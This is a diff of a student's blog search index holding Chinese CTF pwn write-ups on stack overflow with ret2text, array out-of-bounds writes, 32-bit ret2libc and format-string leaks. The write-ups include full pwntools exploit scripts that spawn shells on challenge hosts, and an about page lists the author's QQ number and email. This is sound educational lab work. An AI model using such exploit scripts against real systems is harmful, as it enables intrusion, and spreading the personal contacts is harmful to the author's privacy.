-exp本身不难写,下面看一下怎么用gdb确定偏移
-from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);gdb.attach(io,&quot;b main&quot;) #在main函数下断点payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)io.sendline(payload)io.interactive()
+首先先点评一下，出题人出这个题缝合了两个关卡，把栈溢出，ret2text和数组越界全都考察了一遍，我认为出的水平非常高，符合新生赛要求
+当然这么简单的一个题我居然想了一天，也确实是见识少了
+int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[40]; // [rsp+0h] [rbp-30h] BYREF  char s1[8]; // [rsp+28h] [rbp-8h] BYREF  init(argc, argv, envp);  puts(&quot;welcome to isctf2024&quot;);  puts(&quot;first i need your team id&quot;);  read(0, buf, 0x30uLL);  if ( strcmp(s1, &quot;admin&quot;) )  &#123;    puts(&quot;no no no&quot;);    exit(0);  &#125;  puts(&quot;ok, go on&quot;);  vuln();  return 0;&#125;
+
+__int64 vuln()&#123;  __int64 result; // rax  _QWORD v1[5]; // [rsp+0h] [rbp-30h] BYREF  __int64 i; // [rsp+28h] [rbp-8h]  for ( i = 0LL; i &lt;= 7; ++i )  &#123;    printf(&quot;please input your %d girlfriend birthday\n&quot;, i + 1);    result = __isoc99_scanf(&quot;%ld&quot;, &amp;v1[i]);  &#125;  return result;&#125;
+
+canary保护关NX保护开PIE关  
+
+存在system和bin&#x2F;sh字符串，而且可以直接getshell
+void __fastcall amaze()&#123;  system(&quot;/bin/sh&quot;);&#125;
+结合本题是除签到以外的第一道pwn题，因此把方向定到了ret2text和栈溢出
+利用栈溢出实现任意写下面来具体分析程序
+第一关考察了利用栈溢出实现任意写，以下是第一段payload
+payload = 0x28 * b&#x27;\x00&#x27;payload += b&#x27;admin\x00\x00\x00&#x27;p.sendafter(b&#x27;team id&#x27;, payload)
+
+我们必须要通过strcmp函数关于s1和admin字符串的比较才能进入vuln函数，但是我们无法通过直接写的方式把admin字符串写到s1里，那我们就要利用栈溢出，先通过read覆盖buf，40个，即0x28个字节，然后会溢出到s1，通过栈溢出实现任意写
+需要注意的是admin后面跟了三个\x00，因为strcmp(a, b)是逐字节比较a和b，直到遇到第一个\x00才停止，\x00也是字符串结束的标志。admin为5个字节，因此我们最好补充三个\x00凑够8个字节，当然一个\x00有时候也可以
+数组越界进vuln函数开始第二关，我们需要关注的是定义了一个大小为5字节的数组v1，以及定义了局部变量i
+然后有一个循环，scanf让我们可以读进long类型的整数,这里需要注意，我们通过这种方式输入的必须是十进制整数，因此我们需要把后门函数的十六进制地址手动转化成十进制的。并且这里用p64打包也是不可以的
+v1[i]需要引起我们的注意，这里就涉及到了数组越界的知识
+关于数组越界，可以参考下面的文章
+
+https://hello-ctf.com/hc-pwn/Stack_Overflow/
+
+总之，程序给v1的内存大小只有五个字节，当我们将其改为v1[6]时，我们就可以往栈上写东西了
+我们的思路是，先一次输入5个数，比如1，1，1，1，1，第六次时输入6，为什么要输入6，是因为此时的栈大概是这样的
+[高地址]RIPRBPiv[4]v[3]v[2]v[1]v[0][低地址]  
+我们输入6后，将会把i覆盖成6，这个时候就能出现a[6]，同时循环也不会结束，（如果我们写入1，循环不会继续进行），由于i小于7，i会继续加1，这就有第七次写入的机会
+我们必须要知道，这个循环不会因为我们的输入而停止，只要i小于等于7，循环一定是会进行的，并且一定会进行8次
+我们可以通过gdb调试一下
+from pwn import *elf = ELF(&quot;./pwn&quot;)context(arch=elf.arch, os=elf.os)context.terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;]context.log_level = &#x27;debug&#x27;p = process([elf.path])#p = remote(&#x27;challenge.imxbt.cn&#x27; , 32106)gdb.attach(p, &#x27;b vuln&#x27;)payload = 0x28 * b&#x27;A&#x27;payload += b&#x27;admin\x00\x00\x00&#x27;#gdb.attach(p , &#x27;b vuln&#x27;)p.sendafter(b&#x27;team id&#x27;, payload)p.interactive()
 
 
+通过gdb调试，我注意到一个很有意思的事，我明明没有覆盖到rbp，但是rbp指针指向的地址里却有个1
 
-0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）
-用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量
-我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址
+这是没有开始覆盖前的栈，可以看到确rbp天然存了一个1，这就让我们不需要再覆盖rbp了，因此直接加上后门函数的地址即可
+from pwn import *#p=process(&quot;./girlfriend&quot;)p=remote(&quot;challenge.imxbt.cn&quot;,32331)payload=b&#x27;a&#x27;*0x28+b&#x27;admin\x00\x00\x00&#x27;p.send(payload)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;6&#x27;)#理论上是需要再sendline一个padding覆盖rbp的p.sendline(str(0x40121E))p.interactive()
+
 
 ]]></content>
       <categories>
@@ -874,6 +746,7 @@ from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.
       </categories>
       <tags>
         <tag>ret2text</tag>
+        <tag>数组越界</tag>
       </tags>
   </entry>
   <entry>
@@ -934,23 +807,144 @@ from pwn import *io = remote (&#x27;pwn.challenge.ctf.show&#x27;,28271)#offset =
       </categories>
   </entry>
   <entry>
-    <title></title>
-    <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
-    <content><![CDATA[]]></content>
+    <title>用gdb的动态视角看ret2text的实现</title>
+    <url>/posts/2ee84d32.html</url>
+    <content><![CDATA[来看一道非常简单的栈溢出
+
+后门函数地址ida里很明显，0x8048521
+exp本身不难写,下面看一下怎么用gdb确定偏移
+from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);gdb.attach(io,&quot;b main&quot;) #在main函数下断点payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)io.sendline(payload)io.interactive()
+
+
+
+0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）
+用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量
+我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址
+
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2text</tag>
+      </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/about/index.html</url>
-    <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn
+    <title>初识32位下的ret2libc</title>
+    <url>/posts/b342ee9.html</url>
+    <content><![CDATA[从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。
+ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处
+egctfshow pwn入门39&amp;41这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh
+首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的
 
-兴趣爱好足球 主队是山东泰山和曼城板绘 爱画一些二次元妹子，但实际上是个现充在看的书 《深入理解计算机系统（CSAPP）》
 
-联系我QQ 1935572185163邮箱 lzr20061008@163.com
+from pwn import *context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)io = process(&quot;./pwn43&quot;)gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420           break *0x08048450&#x27;&#x27;&#x27;)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;A&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)payload += p32(buf2)payload += p32(buf2)io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()
+整个流程如下：
+1.函数返回，执行 ret → 跳到 gets
+2.gets(buf2) 读取我们下一次 sendline 的 “&#x2F;bin&#x2F;sh”
+3.gets 执行完后 ret → 跳到 system
+4.system(buf2) → 执行 &#x2F;bin&#x2F;sh，获得 shell
+让chatgpt帮忙画了一个栈图
+
+
+
+地址
+内容
+含义
+
+
+
+ESP+12
+buf2
+system(“&#x2F;bin&#x2F;sh”) 参数
+
+
+ESP+8
+buf2
+gets(buf2) 参数
+
+
+ESP+4
+system
+gets 返回后跳到这里
+
+
+ESP
+gets
+ret → gets
+
+
+
+（低地址）
+
+
+
+要特别注意的是，我们的payload并不直接执行压栈操作，而是覆盖内存，因此此我们不能用简单的先进后出来解释payload的顺序。我们必须知道，内存的写入方向是从低地址向高地址，虽然内存增长和栈增长没有必然关系，但是我们直观上可以理解为两者的方向是相反的
+在溢出中，我们只能覆盖返回地址,不能直接移动ESP。ret指令会自动让ESP上移到返回地址的位置，并读取该地址。因此，我们把gets写到返回地址处，而不是尝试让ESP指向gets
+
+
 ]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初识格式化字符串（上）</title>
+    <url>/posts/c6380b0f.html</url>
+    <content><![CDATA[深入理解格式化字符串要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如printf(&quot;%d %f\n&quot;, x, y);，它的一参是x吗？
+让我们来看看printf的声明，int printf(const char *format, ...)，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的
+我们必须要深刻理解的第二个问题是，什么是格式化字符串
+
+格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。
+
+（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）
+通俗的说，它就是包含格式化占位符的字符串
+格式化字符串的工作原理我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数
+这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。
+#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b,c);return 0;
+在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据
+#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b);return 0;
+而我们去掉了参数c会发生什么呢
+结果会是：1 2 一个很奇怪的数
+因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的
+#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %p&quot;,a,b);return 0;
+
+我们把占位符改成%p，输出的结果就是c在栈上的地址
+#include&lt;stdio.h&gt;char a[]scanf(&quot;%s&quot;,&amp;)printf(a);return 0;
+更极端的情况如上
+因此，我们可以利用格式化字符串实现可读可写
+eg1：newstar2025 week2 刻在栈上的秘密
+题目内容：欢迎来到 x64 位餐厅！服务员 printf 先生有点健忘，他只能记住您菜单上的前 6 道菜 (RDI, RSI, RDX…)，再多就只能堆在摇摇晃晃的餐盘 (栈) 上了。更糟糕的是，他会把你写的菜单原封不动地大声念出来。你能设计一份别有用心的菜单，让他念着念着，就把秘密房间的密码念给你听吗？
+
+这个题没有给我们可执行文件，直接nc链接做即可
+
+我们先输入aaaa加几个%p试一下，发现没有看到41414141，这说明aaaa被当成了格式化字符串的一部分被传入了。由于题目简单，我合理推测该prntf函数只有一个参数，即偏移量为0。不过这不重要，正常题目不会这样的
+
+下面开始正式做题
+
+我们可以看到，第11个%p打印出了密码所在寄存器的地址
+
+
+总结格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>格式化字符串</tag>
+      </tags>
   </entry>
   <entry>
     <title>分类</title>
     <url>/archive/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -1401,6 +1395,16 @@ div#category {
 
 
 
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/about/index.html</url>
+    <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn
+
+兴趣爱好足球 主队是山东泰山和曼城板绘 爱画一些二次元妹子，但实际上是个现充在看的书 《深入理解计算机系统（CSAPP）》
+
+联系我QQ 1935572185163邮箱 lzr20061008@163.com
 ]]></content>
   </entry>
   <entry>
